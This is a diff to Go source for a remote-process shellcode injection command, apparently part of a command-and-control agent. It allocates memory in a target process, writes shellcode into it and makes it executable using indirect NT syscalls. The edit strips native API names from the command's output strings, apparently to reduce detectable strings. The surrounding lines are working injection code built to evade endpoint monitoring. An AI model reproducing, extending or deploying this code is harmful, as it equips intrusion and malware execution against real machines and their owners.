@@ -288,13 +288,13 @@ func (c *VanillaInjectionCommand) executeIndirect(pid int, shellcode []byte, out
 	// Step 2: Allocate RW memory (W^X: write first, then change to RX)
 	regionSize := uintptr(len(shellcode))
 	var baseAddr uintptr
-	output += fmt.Sprintf("[*] Allocating %d bytes of RW memory via NtAllocateVirtualMemory...\n", regionSize)
+	output += fmt.Sprintf("[*] Allocating %d bytes of RW memory...\n", regionSize)
 
 	status = IndirectNtAllocateVirtualMemory(hProcess, &baseAddr, &regionSize,
 		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 	if status != 0 {
 		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] NtAllocateVirtualMemory failed: NTSTATUS 0x%X\n", status),
+			Output:    output + fmt.Sprintf("[!] Memory allocation failed: NTSTATUS 0x%X\n", status),
 			Status:    "error",
 			Completed: true,
 		}
@@ -302,15 +302,15 @@ func (c *VanillaInjectionCommand) executeIndirect(pid int, shellcode []byte, out
 
 	output += fmt.Sprintf("[+] Allocated memory at address: 0x%X\n", baseAddr)
 
-	// Step 3: Write shellcode via NtWriteVirtualMemory
-	output += "[*] Writing shellcode via NtWriteVirtualMemory...\n"
+	// Step 3: Write shellcode
+	output += "[*] Writing shellcode...\n"
 
 	var bytesWritten uintptr
 	status = IndirectNtWriteVirtualMemory(hProcess, baseAddr,
 		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
 	if status != 0 {
 		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] NtWriteVirtualMemory failed: NTSTATUS 0x%X\n", status),
+			Output:    output + fmt.Sprintf("[!] Memory write failed: NTSTATUS 0x%X\n", status),
 			Status:    "error",
 			Completed: true,
 		}
@@ -319,7 +319,7 @@ func (c *VanillaInjectionCommand) executeIndirect(pid int, shellcode []byte, out
 	output += fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten)
 
 	// Step 4: Change protection from RW to RX (W^X enforcement)
-	output += "[*] Changing memory protection to RX via NtProtectVirtualMemory...\n"
+	output += "[*] Changing memory protection to RX...\n"
 
 	protectAddr := baseAddr
 	protectSize := uintptr(len(shellcode))
@@ -328,7 +328,7 @@ func (c *VanillaInjectionCommand) executeIndirect(pid int, shellcode []byte, out
 		PAGE_EXECUTE_READ, &oldProtect)
 	if status != 0 {
 		return structs.CommandResult{
-			Output:    output + fmt.Sprintf("[!] NtProtectVirtualMemory failed: NTSTATUS 0x%X\n", status),
+			Output:    output + fmt.Sprintf("[!] Memory protection change failed: NTSTATUS 0x%X\n", status),
 			Status:    "error",
 			Completed: true,
 		}
